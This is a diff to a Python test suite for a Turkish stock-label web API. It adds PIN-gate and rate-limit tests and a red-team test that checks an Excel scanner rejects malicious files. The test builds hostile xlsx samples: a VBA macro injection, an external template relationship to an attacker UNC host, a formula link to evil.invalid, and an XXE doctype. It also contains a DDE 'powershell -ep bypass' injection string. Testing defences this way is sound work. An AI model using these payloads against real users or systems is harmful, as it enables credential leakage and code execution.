@@ -22,10 +22,13 @@ from app.telegram_service import (  # noqa: E402
 )
 
 BASE_URL = "http://127.0.0.1:8000"
+SAFE_TOKEN: str = ""
 
 
-def api_call(method: str, path: str, body=None, headers=None):
+def api_call(method: str, path: str, body=None, headers=None, include_pin_token: bool = True):
     req_headers = {"Content-Type": "application/json"}
+    if include_pin_token and SAFE_TOKEN:
+        req_headers["X-Safe-Browser-Token"] = SAFE_TOKEN
     if headers:
         req_headers.update(headers)
     data = json.dumps(body).encode("utf-8") if body is not None else None
@@ -59,7 +62,18 @@ class ComprehensiveSystemTests(unittest.TestCase):
 
     @classmethod
     def setUpClass(cls):
+        global SAFE_TOKEN
+        from app.routers.auth import compute_current_time_pin
+
         cls.created_ids = []
+        st_pin, _, pin_body = api_call(
+            "POST",
+            "/api/auth/pin",
+            {"pin": compute_current_time_pin()},
+            include_pin_token=False,
+        )
+        assert st_pin == 200 and pin_body.get("safe_token"), f"PIN auth failed: {pin_body}"
+        SAFE_TOKEN = pin_body["safe_token"]
         with engine.begin() as conn:
             rows = conn.execute(text("SELECT key, value FROM app_settings")).fetchall()
             cls.saved_settings = {r[0]: r[1] for r in rows}
@@ -90,6 +104,9 @@ class ComprehensiveSystemTests(unittest.TestCase):
             ).scalar_one()
             next_val = max(100001, int(max_code) + 1)
             conn.execute(text(f"ALTER SEQUENCE pkt_label_seq RESTART WITH {next_val}"))
+
+    def track(self, item_id: int) -> None:
+        self.created_ids.append(item_id)
 
     def _track_create(self, payload: dict) -> dict:
         st, _, body = api_call("POST", "/api/stock", payload)
@@ -179,7 +196,7 @@ class ComprehensiveSystemTests(unittest.TestCase):
             }
         )
         self.assertEqual(created["reference"], "QA-SGUOCII-99")
-        self.assertEqual(created["level"], "REV-GUSIOC")
+        self.assertEqual(created["level"], "REV GUSIOC")
         self.assertEqual(created["location_note"], "Raf Özel Bölge")
 
     def test_04_max_length_boundary_no_truncation_500(self):
@@ -403,7 +420,9 @@ class ComprehensiveSystemTests(unittest.TestCase):
         _ = it2
 
     def test_12_admin_password_rate_limit_and_settings_persistence(self):
-        fake_ip_header = {"X-Forwarded-For": "203.0.113.177"}
+        import random
+
+        fake_ip_header = {"X-Forwarded-For": f"198.18.{random.randint(1,254)}.{random.randint(1,254)}"}
 
         # 10 hatalı deneme -> 401
         for _ in range(10):
@@ -574,9 +593,14 @@ class ComprehensiveSystemTests(unittest.TestCase):
         self.assertEqual(restored_detail["remaining_quantity"], 18)
 
         # 5) Excel export (.xlsx) doğrulaması ve '=' formül enjeksiyonu güvenliği
-        req = urllib.request.Request(f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE&q=TEST-RESTORE-QR")
+        req = urllib.request.Request(
+            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE&q=TEST-RESTORE-QR",
+            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
+        )
         with urllib.request.urlopen(req, timeout=10) as resp:
             self.assertEqual(resp.status, 200)
+            self.assertEqual(resp.headers.get("X-Scan-Verdict"), "CLEAN-OOXML")
+            self.assertTrue(resp.headers.get("X-Content-SHA256"))
             xlsx_bytes = resp.read()
         wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
         self.assertIn("Stok Etiketleri", wb.sheetnames)
@@ -585,6 +609,7 @@ class ComprehensiveSystemTests(unittest.TestCase):
         self.assertEqual(ws["B2"].value, "TEST-RESTORE-QR")
         self.assertEqual(ws["G2"].value, "=RAF-A1")
         self.assertEqual(ws["G2"].data_type, "s")
+        self.assertTrue(ws["G2"].quotePrefix)
 
     def test_15_level_canonical_normalization_and_separation(self):
         # 1-AA, 1 aa, 1Aa, 1/aa -> hepsi 1AA olmalı
@@ -642,6 +667,265 @@ class ComprehensiveSystemTests(unittest.TestCase):
         )
         self.assertEqual(matched[0]["total_exact_quantity"], 3)
         self.assertEqual(matched[0]["total_other_quantity"], 8)
+
+    def test_16_pin_gate_and_excel_malware_redteam_defense(self):
+        import hashlib
+        import io
+        import zipfile
+        import openpyxl
+        from datetime import datetime, timedelta, timezone
+        from app.excel_security import ExcelSecurityError, inspect_and_verify_xlsx_bytes
+        from app.routers.auth import TR_TZ, compute_current_time_pin
+
+        # 0) Dinamik tarih+saat PIN formatı kontrolü: 16 Kasım 14:50 -> '16111450'
+        sample_dt = datetime(2026, 11, 16, 14, 50, 25, tzinfo=TR_TZ)
+        self.assertEqual(compute_current_time_pin(sample_dt), "16111450")
+        self.assertEqual(compute_current_time_pin(sample_dt + timedelta(minutes=1)), "16111451")
+
+        # 1) PIN olmadan /api/stock ve /api/stock/export.xlsx erişimi 401 dönmeli
+        st_unauth, hdr_unauth, _ = api_call("GET", "/api/stock", include_pin_token=False)
+        self.assertEqual(st_unauth, 401)
+        self.assertIn("content-security-policy", hdr_unauth)
+        self.assertEqual(hdr_unauth.get("x-content-type-options"), "nosniff")
+
+        st_exp_unauth, _, _ = api_call("GET", "/api/stock/export.xlsx", include_pin_token=False)
+        self.assertEqual(st_exp_unauth, 401)
+
+        # 1 dakika önceki veya 1 dakika sonraki PIN kabul edilmemeli!
+        prev_min_pin = compute_current_time_pin(datetime.now(timezone.utc) - timedelta(minutes=1))
+        st_expired, _, _ = api_call(
+            "POST",
+            "/api/auth/pin",
+            {"pin": prev_min_pin},
+            headers={"X-Forwarded-For": "203.0.113.198"},
+            include_pin_token=False,
+        )
+        self.assertEqual(st_expired, 401)
+
+        # 2) Yanlış PIN denemesi 401, ardışık 12 hatalı denemede 429 rate-limit dönmeli
+        import random
+
+        troll_ip = {"X-Forwarded-For": f"198.19.{random.randint(1,254)}.{random.randint(1,254)}"}
+        for _ in range(12):
+            st_bad, _, _ = api_call(
+                "POST",
+                "/api/auth/pin",
+                {"pin": "00000000"},
+                headers=troll_ip,
+                include_pin_token=False,
+            )
+            self.assertEqual(st_bad, 401)
+        st_rate, _, _ = api_call(
+            "POST",
+            "/api/auth/pin",
+            {"pin": compute_current_time_pin()},
+            headers=troll_ip,
+            include_pin_token=False,
+        )
+        self.assertEqual(st_rate, 429)
+
+        # 3) Doğru dinamik PIN (GGAAHHDD) kalıcı HttpOnly çerez + safe_token üretmeli
+        safe_ip = {"X-Forwarded-For": "203.0.113.200"}
+        st_ok, ok_hdrs, ok_body = api_call(
+            "POST",
+            "/api/auth/pin",
+            {"pin": compute_current_time_pin()},
+            headers=safe_ip,
+            include_pin_token=False,
+        )
+        self.assertEqual(st_ok, 200)
+        set_cookie = ok_hdrs.get("set-cookie", "")
+        self.assertIn("pkt_safe_browser=", set_cookie)
+        self.assertIn("httponly", set_cookie.lower())
+        cookie_pair = set_cookie.split(";", 1)[0]
+
+        st_sess, _, sess_body = api_call(
+            "GET",
+            "/api/auth/session",
+            headers={"Cookie": cookie_pair},
+            include_pin_token=False,
+        )
+        self.assertEqual(st_sess, 200)
+        self.assertTrue(sess_body["authenticated"])
+
+        # 4) Red-Team Zararlı Excel Senaryoları — Hepsi anında yakalanıp engellenmeli!
+        # Geçerli baz Excel al
+        req = urllib.request.Request(
+            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE",
+            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            clean_xlsx = resp.read()
+            srv_sha = resp.headers.get("X-Content-SHA256")
+        self.assertEqual(inspect_and_verify_xlsx_bytes(clean_xlsx), srv_sha)
+        self.assertEqual(hashlib.sha256(clean_xlsx).hexdigest(), srv_sha)
+
+        # Saldırı A: .xlsx kılığına sokulmuş Windows EXE (MZ)
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(b"MZ\x90\x00" + b"A" * 512)
+
+        # Saldırı B: Eski tip makro/Equation Editor OLE2 konteyneri
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512)
+
+        # Saldırı C: Dosya sonuna eklenmiş gizli payload (Polyglot ZIP+EXE)
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(clean_xlsx + b"MZ_HIDDEN_PAYLOAD")
+
+        def mutate_zip(mutator_fn) -> bytes:
+            out_buf = io.BytesIO()
+            with zipfile.ZipFile(io.BytesIO(clean_xlsx), "r") as zin, zipfile.ZipFile(
+                out_buf, "w", zipfile.ZIP_DEFLATED
+            ) as zout:
+                entries = {n: zin.read(n) for n in zin.namelist()}
+                mutator_fn(entries)
+                for k_name, val_bytes in entries.items():
+                    zout.writestr(k_name, val_bytes)
+            return out_buf.getvalue()
+
+        # Saldırı D: VBA Makrosu (xl/vbaProject.bin) enjekte edilmiş Excel
+        trojan_vba = mutate_zip(lambda e: e.__setitem__("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0VBA"))
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(trojan_vba)
+
+        # Saldırı E: Gömülü OLE / ActiveX nesnesi (xl/embeddings/oleObject1.bin)
+        trojan_ole = mutate_zip(lambda e: e.__setitem__("xl/embeddings/oleObject1.bin", b"OLE_EXPLOIT"))
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(trojan_ole)
+
+        # Saldırı F: Dış SMB/NTLM sızıntısı veya Follina ms-msdt: External Relationship
+        def inject_external_rel(entries):
+            rels_xml = entries["xl/_rels/workbook.xml.rels"].decode("utf-8")
+            evil_rel = (
+                '<Relationship Id="rId999" '
+                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+                'Target="\\\\evil.example.com\\share\\payload.dotm" TargetMode="External"/></Relationships>'
+            )
+            entries["xl/_rels/workbook.xml.rels"] = rels_xml.replace("</Relationships>", evil_rel).encode("utf-8")
+
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(mutate_zip(inject_external_rel))
+
+        # Saldırı G: Hücre içine gizlice <f> formülü enjekte edilmesi
+        def inject_formula_tag(entries):
+            s1 = entries["xl/worksheets/sheet1.xml"].decode("utf-8")
+            entries["xl/worksheets/sheet1.xml"] = s1.replace(
+                "</sheetData>",
+                '<row r="9999"><c r="A9999"><f>HYPERLINK("http://evil.invalid","Click")</f></c></row></sheetData>',
+            ).encode("utf-8")
+
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(mutate_zip(inject_formula_tag))
+
+        # Saldırı H: XML XXE / DTD enjeksiyonu
+        def inject_xxe(entries):
+            wb_xml = entries["xl/workbook.xml"].decode("utf-8")
+            entries["xl/workbook.xml"] = (
+                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>' + wb_xml
+            ).encode("utf-8")
+
+        with self.assertRaises(ExcelSecurityError):
+            inspect_and_verify_xlsx_bytes(mutate_zip(inject_xxe))
+
+        # 5) Veritabanına DDE / Komut enjeksiyonlu metin girildiğinde Excel'de etkisizleştirilmeli
+        dde_item = self._track_create(
+            {
+                "reference": "TEST-DDE-SAFE",
+                "quantity": 5,
+                "level": "1AA",
+                "location_note": "=CMD|'/C powershell -ep bypass'!A0",
+            }
+        )
+        req_dde = urllib.request.Request(
+            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE&q={dde_item['label_code']}",
+            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
+        )
+        with urllib.request.urlopen(req_dde, timeout=10) as resp_dde:
+            dde_xlsx = resp_dde.read()
+        wb_dde = openpyxl.load_workbook(io.BytesIO(dde_xlsx))
+        cell_val = wb_dde["Stok Etiketleri"]["G2"].value
+        self.assertTrue(cell_val.startswith("'[METİN]"), f"DDE not neutralized: {cell_val}")
+        self.assertNotIn("|", cell_val)
+
+    def test_17_scan_transfer_and_status_lifecycle(self):
+        import io
+        import openpyxl
+
+        item = self._track_create(
+            {
+                "reference": "TEST-TRANSFER-FLOW",
+                "quantity": 25,
+                "level": "1AD P02",
+                "created_by": "Seval",
+            }
+        )
+        self.assertEqual(item["status"], "IN_STOCK")
+        self.assertIsNone(item.get("transferred_to"))
+
+        # 1) Etiketi okutarak 'Paketleme Hat-1' konumuna transfer et
+        st_tr, _, tr_item = api_call(
+            "POST",
+            "/api/stock/scan-transfer",
+            {
+                "qr_or_code": item["qr_payload"],
+                "target_location": "paketleme hat-1",
+                "note": "Sabah vardiyası",
+            },
+        )
+        self.assertEqual(st_tr, 200)
+        self.assertEqual(tr_item["status"], "TRANSFERRED")
+        self.assertEqual(tr_item["transferred_to"], "PAKETLEME HAT-1")
+        self.assertIsNotNone(tr_item["transferred_at"])
+        self.assertEqual(tr_item["movements"][0]["action"], "TRANSFERRED")
+
+        # 2) Dashboard'da TRANSFERRED filtresinde ve transfer yeri aramasında görünmeli
+        st_dash, _, dash = api_call(
+            "GET",
+            "/api/stock/dashboard?status=TRANSFERRED&q=PAKETLEME%20HAT-1",
+        )
+        self.assertEqual(st_dash, 200)
+        self.assertGreaterEqual(dash["summary"]["transferred_label_count"], 1)
+        self.assertTrue(any(x["id"] == item["id"] for x in dash["items"]))
+
+        # 3) Üretim eşleştirmede (match) transferdeki ürün de aktif stok olarak yakalanmalı
+        _, _, matched = api_call(
+            "POST",
+            "/api/stock/match",
+            {"queries": [{"reference": "TEST-TRANSFER-FLOW", "level": "1AD P02"}]},
+        )
+        self.assertEqual(matched[0]["total_exact_quantity"], 25)
+        self.assertEqual(matched[0]["exact_level_matches"][0]["transferred_to"], "PAKETLEME HAT-1")
+
+        # 4) Excel aktarımında durum 'Transfer: PAKETLEME HAT-1' olarak geçmeli ve güvenlik taramasından geçmeli
+        req_xl = urllib.request.Request(
+            f"{BASE_URL}/api/stock/export.xlsx?status=TRANSFERRED&q={item['label_code']}",
+            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
+        )
+        with urllib.request.urlopen(req_xl, timeout=10) as resp_xl:
+            self.assertEqual(resp_xl.headers.get("X-Scan-Verdict"), "CLEAN-OOXML")
+            wb = openpyxl.load_workbook(io.BytesIO(resp_xl.read()))
+            self.assertEqual(wb["Stok Etiketleri"]["F2"].value, "Transfer: PAKETLEME HAT-1")
+
+        # 5) Transferdeyken kısmi düşüm yapıldığında kalan adet aynı transfer yerinde kalmalı
+        st_part, _, part_item = api_call(
+            "POST",
+            "/api/stock/scan-deduct",
+            {"qr_or_code": item["label_code"], "deduct_quantity": 10},
+        )
+        self.assertEqual(st_part, 200)
+        self.assertEqual(part_item["remaining_quantity"], 15)
+        self.assertEqual(part_item["status"], "TRANSFERRED")
+        self.assertEqual(part_item["transferred_to"], "PAKETLEME HAT-1")
+
+        # 6) 'DEPO' hedefine okutulduğunda tekrar 'IN_STOCK' (Depoda) durumuna dönmeli
+        st_ret, _, ret_item = api_call(
+            "POST",
+            "/api/stock/scan-transfer",
+            {"qr_or_code": item["label_code"], "target_location": "DEPO"},
+        )
+        self.assertEqual(st_ret, 200)
+        self.assertEqual(ret_item["status"], "IN_STOCK")
+        self.assertIsNone(ret_item["transferred_to"])
 
 
 if __name__ == "__main__":
